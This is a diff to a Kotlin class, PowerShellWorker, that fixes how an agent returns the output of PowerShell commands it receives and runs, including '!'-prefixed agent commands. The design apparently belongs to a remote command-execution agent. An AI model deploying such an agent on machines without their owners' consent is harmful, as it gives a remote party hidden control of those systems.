@@ -31,9 +31,9 @@ class PowerShellWorker(private val agent : Agent) : Runnable{
     private fun executePowerShell(command: Command) : Array<String> {
         return try {
             val response : PowerShellResponse = ps.executeCommand(command.cmd)
-            arrayOf(response.commandOutput.split(" ").to
+            response.commandOutput.split("\n").toTypedArray()
         } catch (ex : PowerShellNotAvailableException) {
-            "NO_PSH: $ex"
+            arrayOf("NO_PSH: $ex")
         }
     }
 
@@ -41,7 +41,7 @@ class PowerShellWorker(private val agent : Agent) : Runnable{
 
         return when(command.cmd.startsWith("!")) {
             true -> Command(handleAgentCommand(command),CommandType.RESPONSE_AGENT)
-            false -> Command(executePowerShell(command), CommandType.RESPONSE_POWERSHELL)
+            false -> Command(executePowerShell(command).joinToString(",","[","]"), CommandType.RESPONSE_POWERSHELL)
         }
     }
     private fun handleAgentCommand(command: Command) : String {
